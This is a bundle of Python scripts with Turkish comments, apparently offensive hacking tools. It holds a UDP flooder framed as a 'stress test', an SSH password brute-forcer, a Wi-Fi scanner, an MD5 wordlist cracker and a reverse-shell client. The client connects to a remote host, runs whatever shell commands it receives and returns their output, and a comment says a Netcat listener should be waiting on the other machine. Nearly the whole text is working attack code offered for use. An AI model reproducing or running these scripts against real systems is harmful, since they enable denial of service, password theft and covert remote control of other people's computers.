import socket
import time
import sys

def stres_testi(hedef_ip, hedef_port, paket_sayisi):
    print(f"[*] {hedef_ip}:{hedef_port} adresine stres testi başlatılıyor...")
    
    # UDP Soketi oluşturuyoruz
    soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 byte'lık sahte veri paketi
    veri_paketi = b"X" * 1024 
    
    gonderilen = 0
    try:
        while gonderilen < paket_sayisi:
            soket.sendto(veri_paketi, (hedef_ip, hedef_port))
            gonderilen += 1
            if gonderilen % 100 == 0:
                print(f"[+] Gönderilen Paket Sayısı: {gonderilen}")
            time.sleep(0.01) # Sistemi kilitlememek için yasal gecikme süresi
            
        print("\n[+] Test başarıyla tamamlandı.")
    except KeyboardInterrupt:
        print("\n[-] Test kullanıcı tarafından durduruldu.")
    except Exception as e:
        print(f"\n[-] Hata oluştu: {e}")
    finally:
        soket.close()

if __name__ == "__main__":
    # Örnek kullanım: Yerel ağdaki test cihazınız
    ip = input("Hedef IP Adresi (Örn: 127.0.0.1): ")
    port = int(input("Hedef Port (Örn: 80): "))
    sayi = int(input("Gönderilecek Paket Sayısı: "))
    stres_testi(ip, port, sayi)
 
import paramiko
import sys

def ssh_sifre_dene(hedef_ip, kullanici_adi, wordlist_yolu):
    print(f"[*] {hedef_ip} için SSH giriş testi başlatılıyor...")
    
    ssh_istemci = paramiko.SSHClient()
    ssh_istemci.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        with open(wordlist_yolu, "r", encoding="utf-8", errors="ignore") as dosya:
            for satir in dosya:
                sifre = satir.strip()
                try:
                    # SSH bağlantısını deniyoruz
                    print(f"[*] Deneniyor: {sifre}")
                    ssh_istemci.connect(hedef_ip, username=kullanici_adi, password=sifre, timeout=3)
                    
                    print(f"\n[+] BAŞARILI! Şifre Bulundu: {sifre}")
                    ssh_istemci.close()
                    return
                except paramiko.AuthenticationException:
                    # Şifre yanlışsa döngü devam eder
                    continue
                except Exception as e:
                    print(f"[-] Bağlantı Hatası: {e}")
                    return
                    
        print("\n[-] Wordlist bitti, uygun şifre bulunamadı.")
    except FileNotFoundError:
        print("[-] Hata: Belirtilen Wordlist dosyası bulunamadı.")

if __name__ == "__main__":
    # Bu kodu çalıştırmadan önce 'pip install paramiko' yazarak kütüphaneyi kurmalısınız.
    ip = input("Hedef Sunucu IP: ")
    user = input("Kullanıcı Adı (Örn: root): ")
    w_list = input("Wordlist Dosya Yolu (Örn: passwords.txt): ")
    ssh_sifre_dene(ip, user, w_list)



import subprocess
import re
import platform

def wifi_tara():
    print("[*] Çevredeki Wi-Fi ağları taranıyor...\n")
    sistem = platform.system()
    
    try:
        if sistem == "Windows":
            # Windows komut satırı üzerinden Wi-Fi taraması
            sonuc = subprocess.check_output(["netsh", "wlan", "show", "networks"]).decode("utf-8", errors="ignore")
            print(sonuc)
            
        elif sistem == "Linux":
            # Linux / Termux (Root yetkisi veya iwlist yüklü olmalıdır)
            # Standart olarak ağ arayüzlerini listeler
            sonuc = subprocess.check_output(["nmcli", "dev", "wifi"], text=True)
            print(sonuc)
            
        else:
            print("[-] Bu işletim sistemi desteklenmiyor.")
            
    except Exception as e:
        print(f"[-] Tarama başarısız oldu. Yetki hatası veya Wi-Fi kartı kapalı: {e}")

if __name__ == "__main__":
    wifi_tara()


import hashlib

def md5_hash_kir(hedef_hash, wordlist_yolu):
    print(f"[*] Hash çözülüyor: {hedef_hash}")
    
    try:
        with open(wordlist_yolu, "r", encoding="utf-8", errors="ignore") as dosya:
            for satir in dosya:
                kelime = satir.strip()
                # Kelimeyi MD5 formatına çeviriyoruz
                hash_deneme = hashlib.md5(kelime.encode('utf-8')).hexdigest()
                
                # Eşleşme kontrolü
                if hash_deneme == hedef_hash:
                    print(f"\n[+] ŞİFRE BULUNDU: {kelime}")
                    return kelime
                    
        print("\n[-] Şifre bu wordlist içerisinde bulunamadı.")
    except FileNotFoundError:
        print("[-] Hata: Wordlist dosyası bulunamadı.")

if __name__ == "__main__":
    # Test için 'siber123' kelimesinin MD5 karşılığı: 09d944a9d70aa5a4c5145b03ef88d5e0
    h_input = input("Çözülecek MD5 Hash Değerini Girin: ").strip().lower()
    w_path = input("Wordlist Yolunu Girin (passwords.txt): ")
    md5_hash_kir(h_input, w_path)




import socket
import subprocess
import os

def istemci_baglantisi(sunucu_ip, sunucu_port):
    print(f"[*] {sunucu_ip}:{sunucu_port} adresindeki ana merkeze bağlanılıyor...")
    
    soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        soket.connect((sunucu_ip, sunucu_port))
        soket.send(b"[+] Baglanti Basarili! Komut bekleniyor...\n")
        
        while True:
            # Karşı taraftan gelen komutu alıyoruz
            komut = soket.recv(1024).decode("utf-8").strip()
            
            if komut.lower() == "cikis":
                break
                
            if komut.startswith("cd "):
                try:
                    os.chdir(komut[3:])
                    soket.send(b"[+] Dizin degistirildi.\n")
                except Exception as e:
                    soket.send(f"[-] Dizin hatasi: {e}\n".encode())
                continue
                
            # Gelen komutu sistem terminalinde çalıştırıp sonucunu geri gönderiyoruz
            cikti = subprocess.Popen(komut, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            sonuc = cikti.stdout.read() + cikti.stderr.read()
            
            if not sonuc:
                sonuc = b"[+] Komut calistirildi (Cikti yok).\n"
                
            soket.send(sonuc)
            
    except Exception as e:
        print(f"[-] Bağlantı koptu veya hata oluştu: {e}")
    finally:
        soket.close()

if __name__ == "__main__":
    # Bu kod çalıştırılmadan önce diğer bilgisayarda bir port dinleyicisi (Netcat) açık olmalıdır.
    ip = input("Bağlanılacak Sunucu IP: ")
    port = int(input("Bağlanılacak Port: "))
    istemci_baglantisi(ip, port)


